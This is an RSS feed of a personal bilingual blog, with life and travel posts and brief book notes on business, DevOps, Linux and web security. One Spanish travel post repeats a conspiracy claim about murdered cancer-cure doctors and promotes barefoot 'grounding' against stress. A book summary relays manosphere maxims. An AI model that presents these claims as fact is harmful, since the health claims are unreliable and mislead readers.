<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Darvein</title><link>https://www.darvein.net/</link><description>Recent content on Darvein</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 29 Apr 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://www.darvein.net/index.xml" rel="self" type="application/rss+xml"/><item><title>Comfort through discomfort</title><link>https://www.darvein.net/posts/comfort-disconfort/</link><pubDate>Mon, 29 Apr 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/comfort-disconfort/</guid><description>Thanks to the discomfort I&amp;rsquo;m becoming a new person, the real me actually.
Here is a list of what is my new comfort now:
Read one single book every day until I finish it Study one single topic every day for a month. Then change the topic. Stop sleeping late. Sleep at 10pm max and waking up at 4AM. No more junk food. Nutritious food only. Cook my own food Repeat the same plates every day No more social media.</description></item><item><title>Objetives for the 2nd Quarter!</title><link>https://www.darvein.net/posts/2nd-quarter-objs/</link><pubDate>Thu, 21 Mar 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/2nd-quarter-objs/</guid><description>Im starting this April with some objectives defined.
Here is what I need ASAP:
Beat everyone in jj, mt and kb Travel and document it Study: Read 5 books (I&amp;rsquo;ve been procastinating this) Clean HTB boxes Learn Tensorflow and Pytorch basics Learn Django, Vuejs Work: Nextbrave 1 customer Binrav 1+ customer(s) Revista &amp;amp; Rutazz: generate some income from ads Pending and not that important:
Languages Music: guitar &amp;amp; piano Let the party begin!</description></item><item><title>Keeping it up!</title><link>https://www.darvein.net/posts/keeping-up/</link><pubDate>Wed, 21 Feb 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/keeping-up/</guid><description>I gotta be honest. I was not at my fullest this week.
I was back to procastinating everything again! &amp;#x1f915;
Annoying things like:
Being at computer until 3AM Skipping Lunch?&amp;hellip; well not anymore, but eating non-healthy food Skipping reading (&amp;hellip; a bunch of books actually) Skipping the development of my own projects Spending too much time on Social Networks Not going for a run just because of the rain It was like this since last week and I&amp;rsquo;ve been fighting with myself to avoid this, today I&amp;rsquo;m trying to catch-up all my activities, all my duties, all my responsabilities and objectives.</description></item><item><title>Family Bonds</title><link>https://www.darvein.net/posts/family-bond/</link><pubDate>Mon, 12 Feb 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/family-bond/</guid><description>All these weekends since last year were great.
I feel like me again, right next with my family, creating and sharing memories that will last forever. Not everything is sweet and warm though, we had to experiment difficulties and hard moments which is exactly what Life offer to us and we have to accept and embrace what life has for us all the good and the bad sides, no excuses, no tantrums &amp;#x1f606;.</description></item><item><title>Eminem The Way I am</title><link>https://www.darvein.net/posts/eminem-the-way-i-am/</link><pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/eminem-the-way-i-am/</guid><description>I really like this song, I used to listen it back when I was 16-17, back then I feelt down most of my days for different reasons, but what really bothered me was people talking about me &amp;ldquo;how I look like, how I walk, how my hair has a different color&amp;rdquo;. I really hated it, people talking about who my girlfriend is, how bad I&amp;rsquo;m in studies, how bad I am in computer games.</description></item><item><title>The Labyrinth</title><link>https://www.darvein.net/posts/labyrinth-movie/</link><pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/labyrinth-movie/</guid><description>This is a great movie just because I watched when I was a kid (4-5 years old?). I had nightmares with this one.
I don&amp;rsquo;t really enjoyed the whole story, but what kept me up watching this all afternoons were the visual effects, the creativity, the music. The story is Ok, its about a young girl that wants his brother back as a &amp;ldquo;dark prince&amp;rdquo; took with him all the way down to his magic castle.</description></item><item><title>Wu Tang Clan CREAM</title><link>https://www.darvein.net/posts/wutangclan-cream/</link><pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/wutangclan-cream/</guid><description>&amp;#x1f4dd; Lyrics: C.R.E.A.M. Lyrics This song is amazing. Most people relates this song to the Capitalism that we live, people suffering and being treated badly just because they are poor or belongs to a lower social class. What I find on this song personally is something more, they talk about being in jail and comparing it the same hell as living outside of jail, real life and jail life are the same hell, conflicts are present on both lives.</description></item><item><title>Yutaka Ozaki 15 Teens Night</title><link>https://www.darvein.net/posts/yutaka-15teen-night/</link><pubDate>Fri, 02 Feb 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/yutaka-15teen-night/</guid><description>Yeah, maybe the song name is incorrect, I&amp;rsquo;m trying to translate it to english from japanese. It basically talks about a boy who is fifteen years old, it talks about all the feelings he can go through in a single solitary night.
Last year (2022) I&amp;rsquo;ve been listening random music in youtube.com and I ended up with Yutaka&amp;rsquo;s music, some people call him the Japanese Kurt Cobain &amp;#x1f604; - dumb people.</description></item><item><title>Improving Everyday</title><link>https://www.darvein.net/posts/improving-now/</link><pubDate>Tue, 30 Jan 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/improving-now/</guid><description>Hey yeah!
I&amp;rsquo;m loving difficult and challenging days. I&amp;rsquo;ve realized I had just few easy going and relaxing days in my life, I have noticed as well that most people have just few days of easy life, most people have many difficult days, most of us and yet we try to escape our own lives.
We should accept it, that is our nature, that is what we were born for. To accept live as it is, on its own terms, not ours.</description></item><item><title>Less is more</title><link>https://www.darvein.net/posts/less-is-more/</link><pubDate>Sun, 14 Jan 2024 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/less-is-more/</guid><description>Long ago I realized I was trying to do many things at once but I didn&amp;rsquo;t put a STOP &amp;#x274c; to that, I kept doing many things at once over and over. I have heard million of times on blog posts, youtube and tiktok videos, books, famouse quotes, chatgpt, etc that we should focus on what is important for us. I already defined what is important for me, I know what is my North I know what is the path and I know how difficult it is, the only pending thing is to execute it like I&amp;rsquo;m doing it right now, the only thing I need to do is to be CONSISTENT every single and fck1ng day.</description></item><item><title>Journey to Martial Arts</title><link>https://www.darvein.net/posts/journey-martial-arts/</link><pubDate>Wed, 20 Dec 2023 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/journey-martial-arts/</guid><description>Its been around 3 months already training in Martial Arts, I&amp;rsquo;m really enjoying this. I started with Muay Thai, it was somewhat hard at the beginning for me as I didn&amp;rsquo;t practice marial arts in the right way before. I tried a little bit of Ninjutsu, Taekwondo, Karate but never commited more than one month to each&amp;hellip;
Now I&amp;rsquo;ve been 3 months (or 4?) already on it and I really regret not being training from my 20s &amp;#x1f622;, anyways, never is late I still have the opportunity to go and train no matter the age, although I don&amp;rsquo;t think I can do anything competitive&amp;hellip; that is for young people that are on their 20s.</description></item><item><title>Another trip to Coroico</title><link>https://www.darvein.net/posts/another-trip-to-coroico/</link><pubDate>Fri, 25 Aug 2023 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/another-trip-to-coroico/</guid><description>This was an unplanned and cool travel to Coroico, initially I had a thought to go there but I wasn&amp;rsquo;t sure and it wasn&amp;rsquo;t confirmed until last minute.
So while driving this was my planning on my head:
Truchas para el Almuerzo en Pongo (Lunch) Cascadas San Jancito y Felix (Afternoon) Tocaña (Next morning) Parque Leque (Next afternoon) Right after the lunch I headed out to &amp;ldquo;Cascadas San Jacinto &amp;amp; Felix&amp;rdquo;, but it was 4.</description></item><item><title>Switch to English</title><link>https://www.darvein.net/posts/switch-to-english/</link><pubDate>Wed, 26 Jul 2023 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/switch-to-english/</guid><description>So, I&amp;rsquo;ve just decided to maintain my personal webpage in English only, I really need to master this language. I&amp;rsquo;ve been speaking this language in a mediocre way, I really wish I could improve it more and get better and better, there is no other way to archive that goal by practicing every day, speaking every day, writting every day, listening every day, that is the way to go.
Starting from now I will share all I want to share in english, hopefully this help me a lot and I can have more readers obviosly &amp;#x1f604;</description></item><item><title>Un viajecito rapidito nomás</title><link>https://www.darvein.net/posts/un-viajecito-rapidito-nomas/</link><pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/un-viajecito-rapidito-nomas/</guid><description>Un fin de semana reparador, con un buen viaje para desconectarse de todo un por un momento.
&amp;#x2015; Aqui calientito, allá atras prefiero no ir por ahora... &amp;#x2015; El clima se estaba cien puntos el primer día, luego se puso feo. El clima ya no es como antes &amp;#x1f604;
No hubo muchas fotografías esta vez como parte del viaje, sino mas bién mas selfies. Aquí algunas.
&amp;#x2015; Practicando fotografía &amp;#x2015; &amp;#x2015; Nada mejor que un buen dia soleado &amp;#x2015; Yo me llevé algunos libros para leer y este otro campeón se llevo la tarea que no hizo en meses para que yo le supervise :evil:</description></item><item><title>Ser Devops estresa un poco</title><link>https://www.darvein.net/posts/ser-devops-estresa/</link><pubDate>Mon, 22 May 2023 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/ser-devops-estresa/</guid><description>La otra vez estaba en mi escritorio haciendo mis tickets jira y revisando algunos reportes de google, cuando de repente mensaje salvaje aparece en mi escritorio, si, no miento, era un mensaje donde decía que Producción esta inestable. Estoy en un nuevo proyecto y aún me estoy familiarizando con las aplicaciones, bueno pero con las pistas que me dieron era obvio que algo andaba mal con el servicio de Kafka.</description></item><item><title>Mejor sin redes sociales</title><link>https://www.darvein.net/posts/mejor-sin-redes-sociales/</link><pubDate>Tue, 16 May 2023 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/mejor-sin-redes-sociales/</guid><description>Soy muy adicto a las redes sociales, ni automizando puedo estar al tanto de todo lo que pasa en internet. Pero luego me doy cuenta que mi mente se estresa, se cansa y no se estimula mas luego de estar leendo tantas cosas diferentes en tan poco tiempo. Dicen que eso afecta a la concetración, asi que me estoy poniendo mas fuerte para dejar de ver novedades en tan poco tiempo, osea, dejar de ver redes sociales.</description></item><item><title>Extrañando viajar...</title><link>https://www.darvein.net/posts/extrano-viajar-estos-dias/</link><pubDate>Sun, 14 May 2023 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/extrano-viajar-estos-dias/</guid><description>Este es el lugar perfecto para almorzar, talvez hasta acampar&amp;hellip;
&amp;#x2015; Por ahi, cerca a Zongo &amp;#x2015; Me había propuesto viajar, conocer mas lugares, explorar naturaleza. Pero el tiempo me ha estado faltando, no falta mucho para volver a continuar con mis recorridos y dejar que la vida y la naturaleza me muestren lo mejor de si mismas.</description></item><item><title>Hogar dulce hogar</title><link>https://www.darvein.net/posts/sweet-home-0/</link><pubDate>Sun, 23 Apr 2023 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/sweet-home-0/</guid><description>&amp;#x2015; Toma frontal en dia soleado &amp;#x2015; El hogar ya va tomando forma. No fué para nada fácil. A veces pienso hubiera sido mejor comprar una casa ya construida, pero bueno, son cosas que uno aprende en la vida y ya estamos a 50% del hogar dulce hogar! &amp;#x1f604;</description></item><item><title>Gracias Toptal!</title><link>https://www.darvein.net/posts/gracias-toptal/</link><pubDate>Mon, 29 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/gracias-toptal/</guid><description>Habia fallado un par de veces al entrar a trabajar a Toptal, pude entrar en el 3er intento. Fué toda una aventura, muchas cosas que contar. Aprendí tanto y crecí mucho en mi carrera aún hoy en día sigo de picada para arriba. Estoy muy agradecido con esta red donde fuí conociendo gente muy profesional y competitiva.
Esta polerita y detallitos se tardaron al menos 3 o 4 meses en llegar, pero al final llego.</description></item><item><title>Sushi de tiempo!</title><link>https://www.darvein.net/posts/sushi-de-tiempo/</link><pubDate>Mon, 29 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/sushi-de-tiempo/</guid><description>Desde hace mucho tiempo extrañaba comer Sushi y cosas de la cocina Asiática, no hubo tanto pescado fresco y crudo en realidad, en la foto pueden apreciar el pescado frito :D, pero agradó volver a pisar un restaurante de comída Asiática.
Y un buen jugo de coco para el camino y la calurosa tarde!
Un muy buen día de fin de semana!</description></item><item><title>Trash in the office!</title><link>https://www.darvein.net/posts/trash-office/</link><pubDate>Mon, 29 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/trash-office/</guid><description>El otro día nos dispusimos recoger las basuras de la oficina. Miren nomas con que me encontré!
A duras penas pudimos meter todo al ascensor!, Buena oportunidad de tomar fotos épicas para el recuerdo :D no se en que momento esto se salió de control haha :D
Botellas de vidrio también!, Drinks!
Este temita de salud deberá ser tratado señores, la salud es muy importante&amp;hellip; será?&amp;hellip;</description></item><item><title>El orgullo de la familia</title><link>https://www.darvein.net/posts/el-orgullo-de-la-familia/</link><pubDate>Sun, 21 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/el-orgullo-de-la-familia/</guid><description>Una graduación muy importante, sin importar la edad, el momento, el lugar nisiquiera las circunstancias mas difíciles de la vida. Cuando ansias tus objetivos, el universo conspira para ayudarte &amp;#x1f4da;.
Un almuerzo bien merecido!
Uno a veces se complica tanto con las cosas y es bien fácil salir huyendo por la puerta que dice &amp;ldquo;Rendite!&amp;rdquo; y a veces no tenemos opción y nos toca a todos salir por esa puerta, y esta bién digo yo, pero luego no debemos olvidar que tenemos cosas pendientes que terminar.</description></item><item><title>El proceso de cambio</title><link>https://www.darvein.net/posts/el-proces-de-cambio/</link><pubDate>Sun, 21 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/el-proces-de-cambio/</guid><description>He vivido ya buen tiempo en casas que no eran mias, en algun momento tenía que pensar seriamente en comprar la mia, propio esfuerzo, propio sacrificio, noches sin dormir, dias sin comer, dias sin familia. Al final del tunel se ve la luz, se requiere mucha perseverancia y paciencia.
El proceso de cambio toma tiempo y no siempre es perfecto, ¡pero llega! &amp;#x1f60b;</description></item><item><title>Los descanzos son importantes</title><link>https://www.darvein.net/posts/los-descanzos-son-importantes/</link><pubDate>Sun, 21 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/los-descanzos-son-importantes/</guid><description>No sé donde dijeron que uno trabajaba 11 meses del año para poder tomar vacaciones un par de semanas, o que muchos trabajaban 5 días a la semana para descanzar dos, o que muchos trabajaban 8 horas al día para poder disfrutar de 3 o 4 horas solamente. Talvez sólo es un tema de percepción, pero igual, siento que ahora es el momento de dejar de trabajar tanto como lo hacía antes y disfrutar mas de la vida.</description></item><item><title>Momentos con la naturaleza</title><link>https://www.darvein.net/posts/momentos-con-la-naturaleza/</link><pubDate>Sun, 21 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/momentos-con-la-naturaleza/</guid><description>Primera vez en la vida que había tenido este tipo de estres donde sentía un dolor incómodo en el pecho, de esa molestía como cuando hacer ejercicios intensos de mucho tiempo y te &amp;ldquo;macurcas&amp;rdquo;. El asuntito duró como dos semanas ya me siento mucho mejor..
&amp;#x2714;&amp;#xfe0f; pero tuve que dormir mejor &amp;#x2714;&amp;#xfe0f; alimentarme mejor &amp;#x2714;&amp;#xfe0f; meditar &amp;#x2714;&amp;#xfe0f; estar en paz &amp;#x2714;&amp;#xfe0f; continuar ejercitando No sabía exactamente dónde ir, una vez fuí al paseo de ingreso a Aranjuéz, pero esos autos y la gasolina que desprendían no me convencía, esta vez fuí al Jardín Botánico de la UMSA en Cota Cota.</description></item><item><title>Otra escapada de finde!</title><link>https://www.darvein.net/posts/otra-escapada-de-finde/</link><pubDate>Sun, 21 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/otra-escapada-de-finde/</guid><description>Esta escapada fué a Huatajata, como lo dije una vez, bien el lugar&amp;hellip; Antes yo no era de viajar o salir, pero ahora estoy con ganas &amp;#x1f604; y nadie quien nos pare &amp;#x1f60e;.
El lugar tiene botes, barcos, barcos inflábles giratorios (?), canchas, lugares para parilla, arena, etc.
Existen ya varios doctores que dijeron haber encontrado cura para el cancer y otras enfermedades pero misteriosamente fallecieron sin completar sus investigaciones, no recuerdo, pero uno de ellos decía que una manera efectiva de desestresarse es descargar la &amp;ldquo;energía&amp;rdquo; acumulada en nuestro cuerpo&amp;hellip; recomendaba pisar tierra con la planta de los pies, tan simple como eso y&amp;hellip; si, tan efectivo &amp;#x1f604;.</description></item><item><title>La buena vida</title><link>https://www.darvein.net/posts/la-buena-vida/</link><pubDate>Sat, 06 Aug 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/la-buena-vida/</guid><description>No me quejo, el esfuerzo siempre trae las recompenzas luego.
El detalle, es que hay que aprender a valorar y disfrutar esas recompenzas.
Darse un break y continuar con la vida.</description></item><item><title>Cualquiera de estos libros esta bien</title><link>https://www.darvein.net/posts/cualquiera-de-estos-esta-bien/</link><pubDate>Sat, 16 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/cualquiera-de-estos-esta-bien/</guid><description>Hoy quería compartir un resumen de uno de estos libros que tanto me gustaron y me acompañaron en momentos dificiles, el problema es que&amp;hellip; creo que el momento dificil era tan dificil que olvidé ya de que trataban los libros, voy a tener que leerlos de nuevo! &amp;#x1f4a9;
Sin embargo, ¡los recomiendo mucho!, realmente se habla y se muestra (con palabras) la otra La Paz de los barrios bajos (incluso El Alto), las calles y lugares que ni salen en Google Maps desde el punto de vista turístico, donde en lugar de restaurantes y patios de comidas hay mas bien cantinas, bares y lugares donde pasar la fria noche en La Paz (si, incluso mas frias de las que describe Jaime Saenz en sus libros).</description></item><item><title>La noche de la Pizza</title><link>https://www.darvein.net/posts/la-noche-de-la-pizza/</link><pubDate>Fri, 15 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/la-noche-de-la-pizza/</guid><description>Bueno, pasa que nosotros de hambre ya llegando al departamento justo vimos esta tienda pequeña que nunca le presté atención&amp;hellip; Esta vez me animé a pasar y ver que había de bueno, y resulta que he probado una de las mejores pizzas en mi vida.
A mi esposa normalmente no le gusta las pizzas, pero esta si le hizo cambiar de opinion.</description></item><item><title>Un dia regular en el trabajo</title><link>https://www.darvein.net/posts/un-dia-regular-en-el-laburo/</link><pubDate>Fri, 15 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/un-dia-regular-en-el-laburo/</guid><description>Aquí con ganas de tomar una foto en el laburo, estos días ya no he estado yendo constante por un tema de Estres &amp;#x1f604;.
No me puedo quejar de esto, es chévere, cómodo, tranquilo, hay comida y sobre todo, las mejores personas del mundo con las que puedo trabajar!.
¡Por mas días como estos!</description></item><item><title>¡A bajar de peso!</title><link>https://www.darvein.net/posts/88kg-reto-bajar-peso/</link><pubDate>Sun, 10 Jul 2022 00:00:00 +0000</pubDate><guid>https://www.darvein.net/posts/88kg-reto-bajar-peso/</guid><description>Hoy me compré finalmente una balanza, no siento que estoy en buen estado físico, he estado yendo al gimnasio pero veo que no lo he estado aprovechando correctamente.
Actualmente estoy pensando cerca los 90 Kg. y mido al rededor de 1.72cm, eso es sobre peso &amp;#x1f604;
Voy a estar ejercitando mas conscientemente y ver los resultados de aquí a un par de semanas.</description></item><item><title/><link>https://www.darvein.net/blog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/blog/</guid><description>Recent posts&amp;hellip; Comfort through discomfort April 29, 2024 One-minute read Life life Thanks to the discomfort I&amp;rsquo;m becoming a new person, the real me actually.
Here is a list of what is my new comfort now:
Read one single book every day until I finish it Study one single topic every day for a month. Then change the topic. Stop sleeping late. Sleep at 10pm max and waking up at 4AM.</description></item><item><title/><link>https://www.darvein.net/books/books_todos/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/books_todos/</guid><description>Books TODOs Board TODOs Book: To kill a mockingbird, Harper Lee Audiobook: Frankenstein By Mary Shelley (fiction) Book: Sigma (terminar de leer y documentar) Audiobook: Santa Biblia - Reina Valera 2000 DOCUMENTAR Audiobook: Rich Dad Poor Dad By Robert T. Kiyosaki DOCUMENTAR Audiobook: The 4-Hour Workweek: Escape 9-5, Live Anywhere, and Join the New Rich (Expanded and Updated) By Timothy Ferriss DOCUMENTAR Book: The alchemist, Paolo Cohelo DOCUMENTAR Kindle: Clean Book: El Aleph Book: The Game: Penetrating the Secret Society Book scifi: 1984, George Orwell Kindle: Ragnarok Kindle: Men Without Women Kindle: A Clockwork Orange Book: Meditaciones de marco Aurelio Book: Cartas a lucilio de Seneca Book: Enquiridion de epicteto Search books &amp;ldquo;Critical Thinking&amp;rdquo; Jerry tennant, healing is voltage Kids Crónicas de Narnia &amp;#x1f517; https://telegra.</description></item><item><title/><link>https://www.darvein.net/books/business/4-hour-week/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/business/4-hour-week/</guid><description>Book: 4 hour week work first and foremost escape night to five, no retirement people don&amp;rsquo;t want to be millionaires they want to experience definiton, elimination, automation, liberation. Deal d is for definition mini retirements
do what you like,work for you
have others working for you
be owner, not the boss or employee
pay day everyday goal
don&amp;rsquo;t fool yourself!
ability to choose!
everything popular is wrong
retirement is not a goal, is the worst case scenario</description></item><item><title/><link>https://www.darvein.net/books/business/rich-dad-poor-dad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/business/rich-dad-poor-dad/</guid><description>Book: Rich Dad Poor Dad Notes Aprender contabilidad Educación fundamento profundo para flexibilidad
Rules: Saber asset vs lialabilities: asset richs, liability poors
Chap3 Focus on assets rather than income No debts no credit cards
Chap4 Capitaliam vs government socialists Gobernment, employes, and banks take a big share With no knowledge power the world pushes you around More employees to get more assetsp
Accounting skill Investing Understand market The lawsuits, protect assets</description></item><item><title/><link>https://www.darvein.net/books/business/zero-to-one/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/business/zero-to-one/</guid><description>Zero to one - Peter Thiel Información Breve.
Info Value Autor Peter Thiel y Blake Masters Fecha 2014 Formato Físico Notas Chapter 1: The challenge of the future
Monopolios y competencia: Thiel sostiene que los monopolios son buenos para la innovación y que la competencia puede ser perjudicial, ya que las empresas pueden quedar atrapadas en una lucha constante por el mercado, sin enfocarse en ideas nuevas y transformadoras. La ley de las startups: Thiel propone que una startup debe centrarse en un mercado pequeño y nicho antes de expandirse a mercados más grandes.</description></item><item><title/><link>https://www.darvein.net/books/coding/python/mastering-python-networking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/coding/python/mastering-python-networking/</guid><description>Mastering Python Networking - Eric Chou empty</description></item><item><title/><link>https://www.darvein.net/books/coding/python/python-crash-course/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/coding/python/python-crash-course/</guid><description>Python Crash Course empty</description></item><item><title/><link>https://www.darvein.net/books/coding/python/violent-python/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/coding/python/violent-python/</guid><description> Violent Python - O-connor</description></item><item><title/><link>https://www.darvein.net/books/devops/book-project-phoenix/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/devops/book-project-phoenix/</guid><description> Project phoenix Things to research theory of constraints Toyota production system lean principles and concepts References ITIL reference The goal (book) Notes of the book Types of work
business requirements internal team tasks change tasks unplanned/firefighting work</description></item><item><title/><link>https://www.darvein.net/books/devops/devops-handbook/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/devops/devops-handbook/</guid><description>Devops Handbook Book: devops handbook notes
Velocity conference materials Points
Developers: respond to rapid market change IT Ops: protects prod envs having stable, secure and reliable envs Book to read: the mythical man-month Lean manfuctaring principles Book: the goal: a process of ongoing improvement Three ways devops
Flow: CI/CD smooth Feedback Learning experiments Intro Problem: misaligned internal goals
Developers: respond to the rapidly changing competitive landscape It: provide stable, reliable and secure service to the customer Which causes daily workaround, firefighting on different areas PM, Development.</description></item><item><title/><link>https://www.darvein.net/books/devops/unix-linux-system-admin/ch2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/devops/unix-linux-system-admin/ch2/</guid><description>Chapter 2 This document is a summary of my own notes on this book.
Boot process Bootstrap process overview:
BIOS vs UEFI? meh&amp;hellip;
Init Variants?: SystemV init, SystemV upstart
Ubuntu 14 running init:
vagrant@worker:~$ ps -fp 1 UID PID PPID C STIME TTY TIME CMD root 1 0 0 03:46 ? 00:00:00 /sbin/init vagrant@worker:~$ /sbin/init --version init (upstart 1.12.1) Copyright (C) 2006-2014 Canonical Ltd., 2011 Scott James Remnant Exploring units:</description></item><item><title/><link>https://www.darvein.net/books/devops/unix-linux-system-admin/ch3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/devops/unix-linux-system-admin/ch3/</guid><description>Chapter 3 System has users and groups Everything is a file: processes, devices, network connections and have uid/gid
root is always 0, gid 0, users starts from 1000
su != sudo
setuid and setgid setuid and setgid: Runs with pre-defined uid/gid instead of the runner user&amp;rsquo;s uid/gid https://www.geeksforgeeks.org/setuid-setgid-and-sticky-bits-in-linux-file-permissions/ sudo /etc/sudoers
sudoreplay Defaults log_output Defaults!/usr/bin/sudoreplay !log_output Defaults!/sbin/reboot !log_output visudo
Disable root account with /bin/false /bin/nonlogin on /etc/passwd
PAM PAM: single-signon Kerberos: network crypto auth (part of AD)</description></item><item><title/><link>https://www.darvein.net/books/fiction/i-robot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/fiction/i-robot/</guid><description>I Robot by Asimov I enjoyed this book a lot!. It caught my attention many times, I fall into the stories on how a robot can really care about us (humans) to the point to lie to us, to hide us information and even control our future, just for the sake of our wellbeing. Robots are designed and built with heavy emphasis of the 3 Robots Laws.
A robot may not injure a human being or, through inaction, allow a human being to come to harm.</description></item><item><title/><link>https://www.darvein.net/books/infosec/the-web-application-hackers-handbook/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/infosec/the-web-application-hackers-handbook/</guid><description>The web application Hackers Handbook Second Edition.
Finding and Exploiting Security Flaws.
By Dafydd Stuttard.
Chapter 1 Web applications are everywhere.
The most common web vulnz:
Cross-site scripting Cross-site request forgery Information leakage Broken access controls Broken authentication SQL Injection Chapter 2 Most web apps ensures security controls with: Authentication, Access Control and Session Management.
As general rule, untrust all user input data. Always sanitize the INPUT as well as the OUTPUT content.</description></item><item><title/><link>https://www.darvein.net/books/life/atomic-habits/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/life/atomic-habits/</guid><description>Atomic Habits tiny changes make a big difference the quality of our lives depend on the quality of our habits
to write a great book you have to become the book
results doesn&amp;rsquo;t come quickly, habits are dismissed bcoz of that
small changes can really impact in the future for good or bad
pay attention to your life trajectory no that much on the results
in order to see results persistence is needed</description></item><item><title/><link>https://www.darvein.net/books/life/sigma/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/life/sigma/</guid><description>SIGMA: Mentalidad para un mundo caótico Este libro resume algunos otros libros sobre el la consientización del valor del hombre hoy en día en base a la historia, biología y naturaleza del mismo en una sociedad que busca aprovecharse de él.
Puntos clave del libro Vive con tus propias relgas y valores, no las del sistema o sociedad El hombre es demigrado en la mente de las personas, todos están en tu contra Se el centro del universo para ti, ponte en primer lugar no mires a otros, no te preocupes por las noticias, olvida todo, tu eres lo primero, tu eres la novedad, tu eres lo importante No busques felicidad busca estar orgulloso de tus logros Los alfas caen atrapados en matrimonios y los beta buscan ser esclavos El hombre no pide permiso ni perdón, toma lo que quiere del mundo Si el enemigo no te teme entonces como podría respetarte?</description></item><item><title/><link>https://www.darvein.net/books/life/the-game/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/life/the-game/</guid><description> The Game - Penetrating the Secret Society</description></item><item><title/><link>https://www.darvein.net/books/readings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/readings/</guid><description>Kids Readings Coco y la luna TBD
El perro y la cometa magica Érase una vez un perro conocido por sus grandes dotes artísticas. Aquel perro era un auténtico fabricante de sueños y de alegrías, gracias a las cometas artesanales que fabricaba. Preciosas estelas que surcaban el cielo tiñéndolo de deliciosos colores.
¡Era tan feliz haciendo lo que hacía! Haciendo feliz a montones de niños que, boquiabiertos con las cometas, conseguían convencer a sus padres para llevarse una y hacerla volar al aire libre.</description></item><item><title/><link>https://www.darvein.net/books/religion/biblia/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/religion/biblia/</guid><description> Biblia Reyna Valera Overview Antiguo testamento antes de Jesucristo. Nuevo Testamente después de Jesucristo Torah, Coran y Antiguo testamento son similares. Algunos libros son los mismos Nuevo testamento: apóstoles de Jesucrísto, fundaciones de la iglesia y fin de los tiempos Antiguo Testamento Genesis: Abraham -&amp;gt; Isaac -&amp;gt; Jacob -&amp;gt; ??</description></item><item><title/><link>https://www.darvein.net/books/tech/staring-into-the-singularity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/books/tech/staring-into-the-singularity/</guid><description>Staring into the singularity 1.2.5 by Eliezer Yudkowsky (article) Source: https://web.archive.org/web/20070613184827/http://yudkowsky.net/singularity.html This article talks about what is the Singularity in technology and how inevitable it is. Given the common sense of math and human evolution, we should reach a point where Artificial Intelligence, Augemented Intelligence or Superintelligent humans (neuron-to-sillicon interfaces) will exist and will enhance themselfs better than ourselves.
